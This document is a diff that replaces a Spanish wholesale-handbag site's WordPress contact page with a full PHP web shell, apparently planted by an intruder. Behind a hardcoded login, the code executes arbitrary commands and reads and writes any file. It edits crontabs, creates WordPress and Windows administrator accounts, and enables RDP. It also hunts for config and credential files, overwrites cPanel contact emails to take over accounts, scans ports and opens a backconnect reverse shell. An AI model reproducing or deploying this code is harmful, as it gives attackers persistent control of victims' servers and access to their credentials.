@@ -1,1155 +1,3542 @@
+<?php
+session_start();
+error_reporting(0);
 
+// Login Configuration - CHANGE THESE!
+$valid_username = "By:doyok4524$#@";
+$valid_password = "By:doyok4524$#@";
+
+// Check if user is logged in
+function isLoggedIn() {
+    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
+}
+
+// Handle login
+if (isset($_POST['login'])) {
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
+    
+    if ($username === $valid_username && $password === $valid_password) {
+        $_SESSION['loggedin'] = true;
+        $_SESSION['username'] = $username;
+        $_SESSION['login_time'] = time();
+        $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $login_error = "Invalid username or password!";
+    }
+}
+
+// Handle logout
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Auto-logout after 1 hour of inactivity
+if (isLoggedIn() && (time() - $_SESSION['login_time']) > 3600) {
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// If not logged in, show login page
+if (!isLoggedIn()) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>DOYOK - KING-UDUD- Login</title>
+        <meta charset="UTF-8">
+        <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+        <style>
+            * { 
+                margin: 0; 
+                padding: 0; 
+                box-sizing: border-box; 
+            }
+            
+            body { 
+                background-color: black;
+                font-family: 'Inter', sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                color: #333;
+            }
+            
+            .login-container {
+                background: rgba(255, 255, 255, 0.95);
+                padding: 40px;
+                border-radius: 15px;
+                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+                width: 100%;
+                max-width: 400px;
+                backdrop-filter: blur(10px);
+            }
+            
+            .login-header {
+                text-align: center;
+                margin-bottom: 30px;
+            }
+            
+            .login-header h1 {
+                color: #2c3e50;
+                margin-bottom: 10px;
+                font-size: 28px;
+            }
+            
+            .login-header p {
+                color: #7f8c8d;
+                font-size: 14px;
+            }
+            
+            .form-group {
+                margin-bottom: 20px;
+            }
+            
+            .form-group label {
+                display: block;
+                margin-bottom: 8px;
+                font-weight: 500;
+                color: #2c3e50;
+            }
+            
+            .form-group input {
+                width: 100%;
+                padding: 12px 15px;
+                border: 2px solid #e1e8ed;
+                border-radius: 8px;
+                font-size: 14px;
+                transition: all 0.3s ease;
+                background: #fff;
+            }
+            
+            .form-group input:focus {
+                outline: none;
+                border-color: #3498db;
+                box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
+            }
+            
+            .login-btn {
+                width: 100%;
+                background: linear-gradient(135deg, #3498db, #2980b9);
+                color: white;
+                border: none;
+                padding: 12px;
+                border-radius: 8px;
+                font-size: 16px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: all 0.3s ease;
+            }
+            
+            .login-btn:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 5px 15px rgba(27, 146, 226, 0.3);
+            }
+            
+            .error-message {
+                background: #e74c3c;
+                color: white;
+                padding: 10px;
+                border-radius: 5px;
+                margin-bottom: 20px;
+                text-align: center;
+                font-size: 14px;
+            }
+            
+            .security-notice {
+                background: #f8f9fa;
+                border: 1px solid #e1e8ed;
+                border-radius: 8px;
+                padding: 15px;
+                margin-top: 20px;
+                font-size: 12px;
+                color: #7f8c8d;
+            }
+            
+            .image-container {
+                width: 100%;
+                height: 80px;
+                border-radius: 8px;
+                overflow: hidden;
+                margin-bottom: 20px;
+            }
+            
+            .full-size-image {
+                width: 100%;
+                height: 100%;
+                object-fit: cover;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-container">
+            <div class="image-container">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBvN9t_Dc5tJ7dtSCeNpDULpjd_KFPhWX5tFB4XeFej6N4QFNkriicEu1f8ybXw19jtJG3WdjExnwdV0Tv4I74Ni85Z-lw855xOQJX3L4uQmR1AkcnpeOm49yjvAjIym9Dn8LsTz6g7GAzs1rNnYhFs7BYWKn49p9-rZ9cZj21G4h2KOf1cgSk437veyg/s500/redhead_001-2.gif" alt="DOYOK - K I N G - UDUD" class="full-size-image">
+            </div>
+            
+            <div class="login-header">
+                <h1><i class="fas fa-terminal"></i>BY:DOYOK</h1>
+                <p>Secure Access Required</p>
+            </div>
+            
+            <?php if (isset($login_error)): ?>
+                <div class="error-message">
+                    <i class="fas fa-exclamation-triangle"></i> <?php echo $login_error; ?>
+                </div>
+            <?php endif; ?>
+            
+            <form method="post">
+                <div class="form-group">
+                    <label for="username"><i class="fas fa-user"></i> Username</label>
+                    <input type="text" id="username" name="username" required autofocus>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                
+                <button type="submit" name="login" class="login-btn">
+                    <i class="fas fa-sign-in-alt"></i> Login
+                </button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// MAIN SHELL CODE STARTS
+$current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
+if (!is_dir($current_dir)) {
+    $current_dir = '.';
+}
+
+$home_dir = realpath(dirname(__FILE__));
+
+// Handle AJAX actions
+if (isset($_POST['ajax'])) {
+    header('Content-Type: application/json');
+    
+    if (isset($_POST['action'])) {
+        switch ($_POST['action']) {
+            case 'execute_command':
+                $output = [];
+                $return_var = 0;
+                @exec($_POST['command'] . ' 2>&1', $output, $return_var);
+                echo json_encode([
+                    'success' => true,
+                    'command' => $_POST['command'],
+                    'output' => implode("\n", $output),
+                    'return_var' => $return_var
+                ]);
+                exit;
+                
+            case 'get_file_content':
+                if (isset($_POST['filepath']) && file_exists($_POST['filepath']) && !is_dir($_POST['filepath'])) {
+                    echo json_encode([
+                        'success' => true,
+                        'content' => file_get_contents($_POST['filepath'])
+                    ]);
+                } else {
+                    echo json_encode([
+                        'success' => false,
+                        'error' => 'File not found'
+                    ]);
+                }
+                exit;
+                
+            case 'save_file_content':
+                if (isset($_POST['filepath']) && isset($_POST['content'])) {
+                    if (file_put_contents($_POST['filepath'], $_POST['content']) !== false) {
+                        echo json_encode(['success' => true]);
+                    } else {
+                        echo json_encode(['success' => false, 'error' => 'Failed to save file']);
+                    }
+                }
+                exit;
+                
+            case 'view_crontab':
+                $output = [];
+                @exec('crontab -l 2>&1', $output, $return_var);
+                if ($return_var !== 0) {
+                    echo json_encode([
+                        'success' => false,
+                        'output' => "No crontab for current user or error reading crontab\n" . implode("\n", $output)
+                    ]);
+                } else {
+                    echo json_encode([
+                        'success' => true,
+                        'output' => implode("\n", $output)
+                    ]);
+                }
+                exit;
+                
+            case 'save_crontab':
+                if (isset($_POST['crontab_content'])) {
+                    $temp_file = tempnam(sys_get_temp_dir(), 'crontab');
+                    file_put_contents($temp_file, $_POST['crontab_content']);
+                    @exec('crontab ' . escapeshellarg($temp_file) . ' 2>&1', $output, $return_var);
+                    @unlink($temp_file);
+                    
+                    if ($return_var === 0) {
+                        echo json_encode([
+                            'success' => true,
+                            'output' => "Crontab updated successfully!"
+                        ]);
+                    } else {
+                        echo json_encode([
+                            'success' => false,
+                            'output' => "Error updating crontab: " . implode("\n", $output)
+                        ]);
+                    }
+                }
+                exit;
+
+            case 'add_wp_user':
+                $username = $_POST['username'] ?? '';
+                $password = $_POST['password'] ?? '';
+                $email = $_POST['email'] ?? '';
+                $role = $_POST['role'] ?? 'subscriber';
+                $wp_config_path = $_POST['wp_config_path'] ?? '';
+                
+                if (!$username || !$password || !$email || !$wp_config_path) {
+                    echo json_encode(['success' => false, 'output' => 'All fields are required']);
+                    exit;
+                }
+                
+                $output = addWordPressUser($username, $password, $email, $role, $wp_config_path);
+                echo json_encode($output);
+                exit;
+
+            case 'scan_ports':
+                $host = $_POST['host'] ?? 'localhost';
+                $ports = $_POST['ports'] ?? '21,22,23,25,53,80,110,115,135,139,143,194,443,445,993,995,1433,3306,3389,5432,5900,6379,27017';
+                $output = scanPorts($host, $ports);
+                echo json_encode($output);
+                exit;
+
+            case 'scan_webshells':
+                $scan_path = $_POST['scan_path'] ?? '/var/www';
+                $output = scanWebshells($scan_path);
+                echo json_encode($output);
+                exit;
+
+            case 'delete_webshell':
+                $file_path = $_POST['file_path'] ?? '';
+                if ($file_path && file_exists($file_path)) {
+                    if (unlink($file_path)) {
+                        echo json_encode(['success' => true, 'output' => 'File deleted successfully']);
+                    } else {
+                        echo json_encode(['success' => false, 'output' => 'Failed to delete file']);
+                    }
+                } else {
+                    echo json_encode(['success' => false, 'output' => 'File not found']);
+                }
+                exit;
+
+            case 'get_webshell_code':
+                $file_path = $_POST['file_path'] ?? '';
+                if ($file_path && file_exists($file_path)) {
+                    $content = file_get_contents($file_path);
+                    echo json_encode(['success' => true, 'content' => $content]);
+                } else {
+                    echo json_encode(['success' => false, 'error' => 'File not found']);
+                }
+                exit;
+
+            case 'backconnect':
+                $host = $_POST['host'] ?? '';
+                $port = $_POST['port'] ?? '4444';
+                $output = backconnect($host, $port);
+                echo json_encode($output);
+                exit;
+
+            case 'scan_config_files':
+                $scan_path = $_POST['scan_path'] ?? '/var/www';
+                $output = scanConfigFiles($scan_path);
+                echo json_encode($output);
+                exit;
+
+            case 'reset_cpanel':
+                $email = $_POST['email'] ?? '';
+                $output = resetCpanel($email);
+                echo json_encode($output);
+                exit;
+
+            case 'zip_files':
+                $files = $_POST['files'] ?? [];
+                $zip_name = $_POST['zip_name'] ?? 'archive.zip';
+                $output = createZip($files, $zip_name, $current_dir);
+                echo json_encode($output);
+                exit;
+
+            case 'unzip_file':
+                $zip_file = $_POST['zip_file'] ?? '';
+                $extract_path = $_POST['extract_path'] ?? '';
+                $output = extractZip($zip_file, $extract_path);
+                echo json_encode($output);
+                exit;
+
+            case 'add_rdp_user':
+                $username = $_POST['username'] ?? '';
+                $password = $_POST['password'] ?? '';
+                $output = addRdpUser($username, $password);
+                echo json_encode($output);
+                exit;
+
+            case 'enable_rdp':
+                $output = enableRdp();
+                echo json_encode($output);
+                exit;
+        }
+    }
+    exit;
+}
+
+// WordPress User Function
+function addWordPressUser($username, $password, $email, $role, $wp_config_path) {
+    if (!file_exists($wp_config_path)) {
+        return ['success' => false, 'output' => 'WordPress config file not found'];
+    }
+    
+    $wp_dir = dirname($wp_config_path);
+    $wp_load = $wp_dir . '/wp-load.php';
+    
+    if (!file_exists($wp_load)) {
+        return ['success' => false, 'output' => 'WordPress not found in this directory'];
+    }
+    
+    $script = "<?php
+define('WP_USE_THEMES', false);
+require_once('$wp_load');
+
+if (!function_exists('wp_create_user')) {
+    echo 'WordPress functions not available';
+    exit;
+}
+
+\$user_id = wp_create_user('$username', '$password', '$email');
+if (is_wp_error(\$user_id)) {
+    echo 'Error: ' . \$user_id->get_error_message();
+} else {
+    \$user = new WP_User(\$user_id);
+    \$user->set_role('$role');
+    echo 'User $username created successfully with role: $role';
+}
+?>";
+    
+    $temp_script = tempnam(sys_get_temp_dir(), 'wp_user_');
+    file_put_contents($temp_script, $script);
+    
+    $output = [];
+    exec("php " . escapeshellarg($temp_script) . " 2>&1", $output);
+    unlink($temp_script);
+    
+    return ['success' => true, 'output' => implode("\n", $output)];
+}
+
+// Port Scanner Function
+function scanPorts($host, $ports) {
+    $port_list = explode(',', $ports);
+    $results = [];
+    
+    foreach ($port_list as $port) {
+        $port = trim($port);
+        $connection = @fsockopen($host, $port, $errno, $errstr, 1);
+        
+        if (is_resource($connection)) {
+            $results[] = "Port $port: OPEN";
+            fclose($connection);
+        } else {
+            $results[] = "Port $port: CLOSED";
+        }
+    }
+    
+    return ['success' => true, 'output' => implode("\n", $results)];
+}
+
+// Webshell Scanner Function
+function scanWebshells($path) {
+    $webshell_patterns = [
+        '/eval\s*\(.*base64_decode/',
+        '/system\s*\(/',
+        '/exec\s*\(/',
+        '/shell_exec\s*\(/',
+        '/passthru\s*\(/',
+        '/popen\s*\(/',
+        '/proc_open/',
+        '/`.*`/',
+        '/assert\s*\(/',
+        '/preg_replace\s*\(.*\/e/',
+        '/create_function/',
+        '/file_put_contents\s*\(.*\$_/',
+        '/file_get_contents\s*\(.*\$_/',
+        '/curl_exec/',
+        '/wget\s+/',
+        '/phpinfo\s*\(/'
+    ];
+    
+    $suspicious_files = [];
+    
+    if (!is_dir($path)) {
+        return ['success' => false, 'output' => 'Directory not found'];
+    }
+    
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    
+    foreach ($iterator as $file) {
+        if ($file->isFile() && in_array($file->getExtension(), ['php', 'phtml', 'txt', 'html', 'htm'])) {
+            $content = file_get_contents($file->getPathname());
+            $matches = [];
+            
+            foreach ($webshell_patterns as $pattern) {
+                if (preg_match($pattern, $content)) {
+                    $matches[] = $pattern;
+                }
+            }
+            
+            if (!empty($matches)) {
+                $suspicious_files[] = [
+                    'path' => $file->getPathname(),
+                    'patterns' => $matches,
+                    'size' => $file->getSize()
+                ];
+            }
+        }
+    }
+    
+    return ['success' => true, 'files' => $suspicious_files];
+}
+
+// Backconnect Function
+function backconnect($host, $port) {
+    $sock = @fsockopen($host, $port, $errno, $errstr, 30);
+    
+    if (!$sock) {
+        return ['success' => false, 'output' => "Failed to connect: $errstr ($errno)"];
+    }
+    
+    fwrite($sock, "Backconnect established from " . $_SERVER['REMOTE_ADDR'] . "\n");
+    
+    while (!feof($sock)) {
+        fwrite($sock, "$ ");
+        $cmd = fgets($sock);
+        
+        if (trim($cmd) == 'exit') {
+            break;
+        }
+        
+        $output = shell_exec($cmd);
+        fwrite($sock, $output);
+    }
+    
+    fclose($sock);
+    return ['success' => true, 'output' => 'Backconnect session completed'];
+}
+
+// Config File Hunter
+function scanConfigFiles($path) {
+    $config_patterns = [
+        'config.php',
+        'configuration.php',
+        'wp-config.php',
+        'config.inc.php',
+        'settings.php',
+        '.env',
+        'config.json',
+        'config.xml',
+        'database.yml',
+        'database.json',
+        'app.config',
+        'web.config',
+        'config.ini',
+        '.htpasswd',
+        '.htaccess'
+    ];
+    
+    $found_files = [];
+    
+    if (!is_dir($path)) {
+        return ['success' => false, 'output' => 'Directory not found'];
+    }
+    
+    $iterator = new RecursiveIteratorIterator(
+        new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS),
+        RecursiveIteratorIterator::SELF_FIRST
+    );
+    
+    foreach ($iterator as $file) {
+        if ($file->isFile()) {
+            $filename = $file->getFilename();
+            
+            foreach ($config_patterns as $pattern) {
+                if (fnmatch($pattern, $filename) || stripos($filename, 'config') !== false) {
+                    $found_files[] = [
+                        'path' => $file->getPathname(),
+                        'size' => $file->getSize(),
+                        'modified' => date('Y-m-d H:i:s', $file->getMTime())
+                    ];
+                    break;
+                }
+            }
+        }
+    }
+    
+    return ['success' => true, 'files' => $found_files];
+}
+
+// Reset cPanel Function
+function resetCpanel($email) {
+    $cpanel_dir = '/home/*/.cpanel/contactinfo';
+    $contact_files = glob($cpanel_dir);
+    
+    if (empty($contact_files)) {
+        return ['success' => false, 'output' => 'No cPanel contactinfo files found'];
+    }
+    
+    $results = [];
+    foreach ($contact_files as $file) {
+        $content = "email: $email\n";
+        if (file_put_contents($file, $content) !== false) {
+            $results[] = "Updated: $file";
+        } else {
+            $results[] = "Failed: $file";
+        }
+    }
+    
+    return ['success' => true, 'output' => implode("\n", $results)];
+}
+
+// Zip Function
+function createZip($files, $zip_name, $current_dir) {
+    if (empty($files)) {
+        return ['success' => false, 'output' => 'No files selected'];
+    }
+    
+    $zip_path = $current_dir . '/' . $zip_name;
+    
+    if (class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        if ($zip->open($zip_path, ZipArchive::CREATE) === TRUE) {
+            foreach ($files as $file) {
+                $file_path = $current_dir . '/' . $file;
+                if (file_exists($file_path)) {
+                    if (is_dir($file_path)) {
+                        addFolderToZip($zip, $file_path, $file);
+                    } else {
+                        $zip->addFile($file_path, $file);
+                    }
+                }
+            }
+            $zip->close();
+            return ['success' => true, 'output' => "Zip file created: $zip_path"];
+        } else {
+            return ['success' => false, 'output' => 'Failed to create zip file'];
+        }
+    } else {
+        $files_str = implode(' ', array_map('escapeshellarg', $files));
+        $command = "cd " . escapeshellarg($current_dir) . " && zip -r " . escapeshellarg($zip_name) . " $files_str 2>&1";
+        exec($command, $output, $return_var);
+        
+        if ($return_var === 0) {
+            return ['success' => true, 'output' => "Zip file created: $zip_path\n" . implode("\n", $output)];
+        } else {
+            return ['success' => false, 'output' => "Failed to create zip file\n" . implode("\n", $output)];
+        }
+    }
+}
+
+function addFolderToZip($zip, $folder, $base_name) {
+    $files = scandir($folder);
+    foreach ($files as $file) {
+        if ($file == '.' || $file == '..') continue;
+        $file_path = $folder . '/' . $file;
+        $local_path = $base_name . '/' . $file;
+        
+        if (is_dir($file_path)) {
+            $zip->addEmptyDir($local_path);
+            addFolderToZip($zip, $file_path, $local_path);
+        } else {
+            $zip->addFile($file_path, $local_path);
+        }
+    }
+}
+
+// Unzip Function
+function extractZip($zip_file, $extract_path = null) {
+    if (!file_exists($zip_file)) {
+        return ['success' => false, 'output' => 'Zip file not found'];
+    }
+    
+    if (!$extract_path) {
+        $extract_path = dirname($zip_file);
+    }
+    
+    if (!is_dir($extract_path)) {
+        mkdir($extract_path, 0755, true);
+    }
+    
+    if (class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        if ($zip->open($zip_file) === TRUE) {
+            $zip->extractTo($extract_path);
+            $zip->close();
+            return ['success' => true, 'output' => "Zip file extracted to: $extract_path"];
+        } else {
+            return ['success' => false, 'output' => 'Failed to extract zip file'];
+        }
+    } else {
+        $command = "unzip -o " . escapeshellarg($zip_file) . " -d " . escapeshellarg($extract_path) . " 2>&1";
+        exec($command, $output, $return_var);
+        
+        if ($return_var === 0) {
+            return ['success' => true, 'output' => "Zip file extracted to: $extract_path\n" . implode("\n", $output)];
+        } else {
+            return ['success' => false, 'output' => "Failed to extract zip file\n" . implode("\n", $output)];
+        }
+    }
+}
+
+// RDP Functions for Windows
+function addRdpUser($username, $password) {
+    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+        return ['success' => false, 'output' => 'This feature is only available on Windows servers'];
+    }
+    
+    $output = [];
+    $return_var = 0;
+    
+    exec("net user " . escapeshellarg($username) . " " . escapeshellarg($password) . " /add 2>&1", $output, $return_var);
+    
+    if ($return_var !== 0) {
+        return ['success' => false, 'output' => "Failed to create user: " . implode("\n", $output)];
+    }
+    
+    exec("net localgroup administrators " . escapeshellarg($username) . " /add 2>&1", $output, $return_var);
+    
+    if ($return_var !== 0) {
+        return ['success' => false, 'output' => "User created but failed to add to administrators: " . implode("\n", $output)];
+    }
+    
+    return ['success' => true, 'output' => "User $username created and added to administrators group"];
+}
+
+function enableRdp() {
+    if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
+        return ['success' => false, 'output' => 'This feature is only available on Windows servers'];
+    }
+    
+    $output = [];
+    $return_var = 0;
+    
+    exec('reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1', $output, $return_var);
+    
+    if ($return_var !== 0) {
+        return ['success' => false, 'output' => "Failed to enable RDP: " . implode("\n", $output)];
+    }
+    
+    exec('netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 2>&1', $output, $return_var);
+    
+    return ['success' => true, 'output' => "RDP enabled and firewall configured"];
+}
+
+// Handle normal actions
+if (isset($_GET['action'])) {
+    switch ($_GET['action']) {
+        case 'download':
+            if (isset($_GET['file']) && file_exists($_GET['file'])) {
+                $file = $_GET['file'];
+                header('Content-Type: application/octet-stream');
+                header('Content-Disposition: attachment; filename="'.basename($file).'"');
+                readfile($file);
+                exit;
+            }
+            break;
+            
+        case 'delete':
+            if (isset($_GET['file'])) {
+                if (is_dir($_GET['file'])) {
+                    @rmdir($_GET['file']);
+                } else {
+                    @unlink($_GET['file']);
+                }
+                header('Location: ?dir='.urlencode($current_dir));
+                exit;
+            }
+            break;
+            
+        case 'chmod':
+            if (isset($_GET['file']) && isset($_GET['perm'])) {
+                @chmod($_GET['file'], octdec($_GET['perm']));
+                header('Location: ?dir='.urlencode($current_dir));
+                exit;
+            }
+            break;
+    }
+}
+
+if (isset($_POST['action']) && !isset($_POST['ajax'])) {
+    switch ($_POST['action']) {
+        case 'upload':
+            if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
+                $target = $current_dir . '/' . $_FILES['file']['name'];
+                @move_uploaded_file($_FILES['file']['tmp_name'], $target);
+                header('Location: ?dir='.urlencode($current_dir));
+                exit;
+            }
+            break;
+            
+        case 'mkdir':
+            if (isset($_POST['dirname']) && !empty($_POST['dirname'])) {
+                @mkdir($current_dir . '/' . $_POST['dirname'], 0755);
+                header('Location: ?dir='.urlencode($current_dir));
+                exit;
+            }
+            break;
+            
+        case 'newfile':
+            if (isset($_POST['filename']) && !empty($_POST['filename'])) {
+                $filepath = $current_dir . '/' . $_POST['filename'];
+                @file_put_contents($filepath, $_POST['filecontent'] ?? '');
+                header('Location: ?dir='.urlencode($current_dir));
+                exit;
+            }
+            break;
+            
+        case 'rename':
+            if (isset($_POST['oldname']) && isset($_POST['newname'])) {
+                @rename($_POST['oldname'], $_POST['newname']);
+                header('Location: ?dir='.urlencode($current_dir));
+                exit;
+            }
+            break;
+    }
+}
+
+// Function to check if directory is writable
+function is_writable_dir($dir) {
+    if (!is_dir($dir)) return false;
+    
+    $test_file = $dir . '/test_' . uniqid() . '.tmp';
+    $result = @file_put_contents($test_file, 'test');
+    if ($result !== false) {
+        @unlink($test_file);
+        return true;
+    }
+    return false;
+}
+?>
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-	<link rel="profile" href="http://gmpg.org/xfn/11">
-	<link rel="pingback" href="https://bolsomadrid.com/xmlrpc.php">
+    <title>DOYOK - K I N G - UDUD</title>
+    <meta charset="UTF-8">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #2c3e50;
+            --secondary: #3498db;
+            --accent: #e74c3c;
+            --success: #27ae60;
+            --warning: #f39c12;
+            --info: #17a2b8;
+            --dark: #1a1a1a;
+            --light: #f8f9fa;
+            --sidebar-bg: #1e2a38;
+            --card-bg: #ffffff;
+            --border-color: #dee2e6;
+            --text-primary: #2c3e50;
+            --text-secondary: #6c757d;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
 
-	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
-	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
-	
-	<!-- This site is optimized with the Yoast SEO plugin v25.7 - https://yoast.com/wordpress/plugins/seo/ -->
-	<title>Contacto - Bolso Madrid</title>
-	<link rel="canonical" href="https://bolsomadrid.com/contacto" />
-	<meta property="og:locale" content="es_ES" />
-	<meta property="og:type" content="article" />
-	<meta property="og:title" content="Contacto - Bolso Madrid" />
-	<meta property="og:description" content="INFORMACIÓN DE CONTACTO Si necesitas ayuda para registrarte en la pagina o hacernos cualquier consulta llámanos o envíanos un email. Tel:" />
-	<meta property="og:url" content="https://bolsomadrid.com/contacto" />
-	<meta property="og:site_name" content="Bolso Madrid" />
-	<meta property="article:modified_time" content="2025-07-15T09:59:33+00:00" />
-	<meta name="twitter:card" content="summary_large_image" />
-	<meta name="twitter:label1" content="Tiempo de lectura" />
-	<meta name="twitter:data1" content="1 minuto" />
-	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://bolsomadrid.com/contacto","url":"https://bolsomadrid.com/contacto","name":"Contacto - Bolso Madrid","isPartOf":{"@id":"https://bolsomadrid.com/#website"},"datePublished":"2018-10-01T20:24:53+00:00","dateModified":"2025-07-15T09:59:33+00:00","breadcrumb":{"@id":"https://bolsomadrid.com/contacto#breadcrumb"},"inLanguage":"es","potentialAction":[{"@type":"ReadAction","target":["https://bolsomadrid.com/contacto"]}]},{"@type":"BreadcrumbList","@id":"https://bolsomadrid.com/contacto#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Portada","item":"https://bolsomadrid.com/"},{"@type":"ListItem","position":2,"name":"Contacto"}]},{"@type":"WebSite","@id":"https://bolsomadrid.com/#website","url":"https://bolsomadrid.com/","name":"Bolso Madrid","description":"Mayorista de Bolsos","publisher":{"@id":"https://bolsomadrid.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://bolsomadrid.com/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"es"},{"@type":"Organization","@id":"https://bolsomadrid.com/#organization","name":"Bolso Madrid","url":"https://bolsomadrid.com/","logo":{"@type":"ImageObject","inLanguage":"es","@id":"https://bolsomadrid.com/#/schema/logo/image/","url":"https://bolsomadrid.com/wp-content/uploads/2021/09/IMG_5509.png","contentUrl":"https://bolsomadrid.com/wp-content/uploads/2021/09/IMG_5509.png","width":346,"height":304,"caption":"Bolso Madrid"},"image":{"@id":"https://bolsomadrid.com/#/schema/logo/image/"}}]}</script>
-	<!-- / Yoast SEO plugin. -->
-
-
-<link rel='dns-prefetch' href='//fonts.googleapis.com' />
-<link rel="alternate" type="application/rss+xml" title="Bolso Madrid &raquo; Feed" href="https://bolsomadrid.com/feed" />
-<link rel="alternate" type="application/rss+xml" title="Bolso Madrid &raquo; Feed de los comentarios" href="https://bolsomadrid.com/comments/feed" />
-
-<style id='wp-emoji-styles-inline-css' type='text/css'>
-
-	img.wp-smiley, img.emoji {
-		display: inline !important;
-		border: none !important;
-		box-shadow: none !important;
-		height: 1em !important;
-		width: 1em !important;
-		margin: 0 0.07em !important;
-		vertical-align: -0.1em !important;
-		background: none !important;
-		padding: 0 !important;
-	}
-</style>
-<link rel='stylesheet' id='wp-block-library-css' href='https://bolsomadrid.com/wp-includes/css/dist/block-library/style.min.css?ver=6.8.2' type='text/css' media='all' />
-<style id='classic-theme-styles-inline-css' type='text/css'>
-/*! This file is auto-generated */
-.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
-</style>
-<style id='global-styles-inline-css' type='text/css'>
-:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: 